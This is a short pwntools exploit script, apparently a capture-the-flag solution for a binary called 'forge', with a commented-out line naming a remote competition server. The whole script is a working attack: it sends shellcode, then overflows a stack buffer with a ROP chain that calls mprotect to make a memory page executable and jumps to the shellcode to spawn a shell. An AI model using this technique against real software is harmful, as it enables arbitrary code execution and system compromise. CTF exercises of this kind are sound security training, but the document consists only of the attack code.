from pwn import *

context.binary=elf=ELF("./forge")


p=process(elf.path)
#p=remote("offsec.m0lecon.it",13504)
pop_rdi=elf.sym.pop_rdi_ret
pop_rsi=elf.sym.pop_rsi_ret
pop_rdx=elf.sym.pop_rdx_ret
ret=ROP(elf).find_gadget(['ret'])[0]
mprotect=elf.sym.mprotect
shellcode_addr=elf.sym.shellcode 
page=shellcode_addr & ~0xfff
shellcode=asm(shellcraft.sh())
offset=64+8
print(hex(mprotect))
print(p.recv())

p.sendline(shellcode)
print(p.recv())
payload=flat(
    b'a'*(offset),
    p64(pop_rdi),p64(page),
    p64(pop_rsi),p64(0x1000),
    p64(pop_rdx),p64(7),
    p64(mprotect),
    
    p64(shellcode_addr)

)

p.sendline(payload)


p.interactive()
